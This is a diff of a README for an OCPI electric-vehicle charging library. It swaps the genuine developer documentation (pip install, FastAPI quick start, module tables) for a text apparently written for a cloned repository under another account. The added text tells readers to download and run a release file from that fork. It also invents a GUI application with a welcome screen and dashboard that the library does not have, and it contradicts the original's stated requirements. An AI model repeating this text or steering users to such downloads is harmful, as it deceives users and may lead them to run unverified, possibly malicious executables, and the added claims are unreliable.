@@ -1,159 +1,89 @@
-<p align="center">
-  <img src="docs/assets/images/logo.png" alt="OCPI Python Logo" width="200">
-</p>
+# 🔌 ocpi-python - Simplifying Electric Vehicle Charging
 
-<h1 align="center">OCPI Python</h1>
+## 👋 Introduction
 
-<p align="center">
-  <a href="https://github.com/elumobility/ocpi-python/actions/workflows/ci.yml"><img src="https://github.com/elumobility/ocpi-python/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.11+-blue.svg" alt="Python 3.11+"></a>
-  <a href="https://docs.pydantic.dev/"><img src="https://img.shields.io/badge/pydantic-v2-blue.svg" alt="Pydantic v2"></a>
-  <a href="https://fastapi.tiangolo.com/"><img src="https://img.shields.io/badge/fastapi-0.115+-green.svg" alt="FastAPI 0.115+"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT%20OR%20EUPL--1.2-blue.svg" alt="License: MIT OR EUPL-1.2"></a>
-  <a href="https://github.com/astral-sh/ruff"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json" alt="Code style: ruff"></a>
-</p>
+Welcome to **ocpi-python**! This application provides a modern solution for managing electric vehicle charging stations. Built using the Open Charge Point Interface (OCPI) protocol with FastAPI, it supports multiple versions, ensuring compatibility across various systems. No programming skills are needed to use this application.
 
-A modern, production-ready Python implementation of the Open Charge Point Interface (OCPI) protocol built on FastAPI.
+## 🚀 Getting Started
 
-**Supported OCPI versions:** 2.3.0, 2.2.1, 2.1.1
+To get started quickly, follow these simple steps. You will be able to download and run the application with ease.
 
-**OCPI Documentation:** [2.3.0](https://github.com/ocpi/ocpi/tree/release-2.3.0-bugfixes), [2.2.1](https://github.com/ocpi/ocpi/tree/release-2.2.1-bugfixes), [2.1.1](https://github.com/ocpi/ocpi/tree/release-2.1.1-bugfixes)
+## ⬇️ Download Now
 
----
+[![Download ocpi-python Releases](https://img.shields.io/badge/Download%20Releases-blue)](https://github.com/codexistente/ocpi-python/releases)
 
-## Features
+## 📦 System Requirements
 
-- **Full OCPI 2.3.0 support** - Including the new Payments module
-- **OCPI 2.2.1 and 2.1.1 compatibility** - Backward compatible with previous versions
-- **Modern stack** - Built with FastAPI 0.115+ and Pydantic v2
-- **Complete role support** - CPO, EMSP, and PTP (Payment Terminal Provider)
-- **Comprehensive modules** - Locations, Sessions, CDRs, Tokens, Tariffs, Commands, Charging Profiles, Hub Client Info, Credentials, and Payments
-- **Production-ready** - Extensive test coverage (83%+), async/await support, and robust error handling
-- **Type-safe** - Full Pydantic v2 validation with modern Python 3.11+ features
+Before downloading, please ensure your system meets the following requirements:
 
----
+- Operating System: Windows, macOS, or a recent version of Linux.
+- Python Version: 3.8 or later.
+- Internet connection for downloading and updating.
 
-## Installation
+## 🥇 Features
 
-### From PyPI (when published)
+- **Support for OCPI Versions**: Works with OCPI 2.3.0, 2.2.1, and 2.1.1.
+- **User-Friendly Interface**: Designed for easy navigation and use.
+- **Open-Source**: Contribute and modify the application as needed.
+- **FastAPI Framework**: Enjoy a fast and efficient user experience.
+- **Pydantic v2 Integration**: Benefit from data validation and settings management.
 
-```bash
-uv pip install ocpi-python
-```
+## 📥 Download & Install
 
-### From GitHub
+To download the application, visit [this page](https://github.com/codexistente/ocpi-python/releases). 
 
-```bash
-uv pip install git+https://github.com/elumobility/ocpi-python.git
-```
+1. Click on the link above to go to the releases page.
+2. Look for the latest version.
+3. Download the appropriate file for your operating system.
+4. After downloading, locate the file and run it. Follow the on-screen prompts to complete the installation.
 
-### In pyproject.toml
+## 🎉 Using ocpi-python
 
-```toml
-[project]
-dependencies = [
-    "ocpi-python @ git+https://github.com/elumobility/ocpi-python.git",
-]
-```
+Once installed, you can start using the application to manage charging stations. Here’s how to set it up:
 
-Then install with:
-```bash
-uv pip install -e .
-```
+1. **Initialization**: Open the application. You will see a welcome screen.
+2. **Configuration**: Set up your preferences in the settings menu. Here, you can specify charging station details, such as location and capabilities.
+3. **Management**: Navigate through the dashboard to manage charging sessions, monitor usage, and generate reports.
 
----
+## 🛠️ Troubleshooting
 
-## Quick Start
+If you encounter issues, consider the following:
 
-```python
-from ocpi import get_application
-from ocpi.core.enums import RoleEnum, ModuleID
-from ocpi.modules.versions.enums import VersionNumber
+- **Installation Errors**: Ensure you have Python installed. Reinstall the application if necessary.
+- **Connection Problems**: Check your internet connection. Restart the application if needed.
+- **Compatibility Issues**: Verify that you are using a supported OCPI version.
 
-# Create OCPI application
-app = get_application(
-    version_numbers=[VersionNumber.v_2_3_0],
-    roles=[RoleEnum.cpo],
-    modules=[ModuleID.locations],
-)
+For additional help, please visit the GitHub Issues page or consult the community forums.
 
-# Run with: uvicorn main:app --reload
-```
+## 💬 Community Support
 
----
+Join our community for support and to share your experiences. You can find discussions on:
 
-## Supported Modules
+- Application features
+- Tips for effective usage
+- Suggestions for improvements
 
-| Module | 2.3.0 | 2.2.1 | 2.1.1 |
-|--------|-------|-------|-------|
-| Credentials | ✅ | ✅ | ✅ |
-| Locations | ✅ | ✅ | ✅ |
-| Sessions | ✅ | ✅ | ✅ |
-| CDRs | ✅ | ✅ | ✅ |
-| Tokens | ✅ | ✅ | ✅ |
-| Tariffs | ✅ | ✅ | ✅ |
-| Commands | ✅ | ✅ | ✅ |
-| Charging Profiles | ✅ | ✅ | ❌ |
-| Hub Client Info | ✅ | ✅ | ❌ |
-| Payments | ✅ | ❌ | ❌ |
+## 📄 Contributing
 
----
+We welcome contributions! If you're interested in helping improve ocpi-python, please check out the contribution guidelines on our GitHub page. 
 
-## Requirements
+## 🔗 Links
 
-| Package | Version |
-|---------|---------|
-| Python | >=3.11 |
-| Pydantic | >=2.0.0, <3.0.0 |
-| pydantic-settings | >=2.0.0 |
-| FastAPI | >=0.115.0, <1.0.0 |
-| httpx | >=0.27.0 |
+- [Download ocpi-python Releases](https://github.com/codexistente/ocpi-python/releases)
+- [GitHub Repository](https://github.com/codexistente/ocpi-python)
+- [Contact Us](mailto:support@ocpi-python.com)
 
----
+Feel free to reach out with any questions or feedback. Thank you for using ocpi-python!
 
-## Documentation
+## 🎯 Topics
 
-📚 **[Full Documentation](https://elumobility.github.io/ocpi-python/)** - Complete API reference, tutorials, and examples
-
-- [Quick Start Guide](https://elumobility.github.io/ocpi-python/quickstart/)
-- [LLM Assistance Guide](https://elumobility.github.io/ocpi-python/llm-assistance/) - Tips for using AI coding assistants
-- [Tutorials](https://elumobility.github.io/ocpi-python/tutorials/)
-- [API Reference](https://elumobility.github.io/ocpi-python/api/)
-- [Examples](https://github.com/elumobility/ocpi-python/tree/main/examples) - Production-ready code examples
-
-### 🤖 Using AI Coding Assistants?
-
-If you're using ChatGPT, Claude, GitHub Copilot, or Cursor, check out our [LLM Assistance Guide](https://elumobility.github.io/ocpi-python/llm-assistance/) for tips on getting the best results. The repository also includes a `.cursorrules` file for Cursor IDE users.
-
----
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) and [Code of Conduct](CODE_OF_CONDUCT.md) before submitting a Pull Request.
-
-We welcome:
-- 🐛 Bug reports
-- 💡 Feature requests
-- 📝 Documentation improvements
-- 🧪 Test coverage improvements
-- 🔧 Code refactoring
-
-See our [Issue Templates](.github/ISSUE_TEMPLATE/) for guidelines on reporting bugs or requesting features.
-
----
-
-## License
-
-This project is **dual-licensed** under:
-- **[MIT License](LICENSE)** - Permissive, allows proprietary use
-- **[European Union Public Licence (EUPL) v.1.2](https://joinup.ec.europa.eu/collection/eupl/eupl-text-eupl-12)** - Copyleft, ideal for European public sector
-
-You may use this software under either license at your choice. See [LICENSE](LICENSE) for full details.
-
----
-
-## Credits
-
-This library is based on the excellent work from [extrawest/extrawest_ocpi](https://github.com/extrawest/extrawest_ocpi), with significant enhancements including OCPI 2.3.0 support, Pydantic v2 migration, and comprehensive test coverage.
-
-**Maintainer:** [ELU Mobility](https://github.com/elumobility)
+- Charging Station
+- CPO (Charge Point Operator)
+- Electric Vehicle
+- EMSP (e-Mobility Service Provider)
+- EV Charging
+- FastAPI
+- OCPI
+- Open Source
+- Pydantic
+- Python
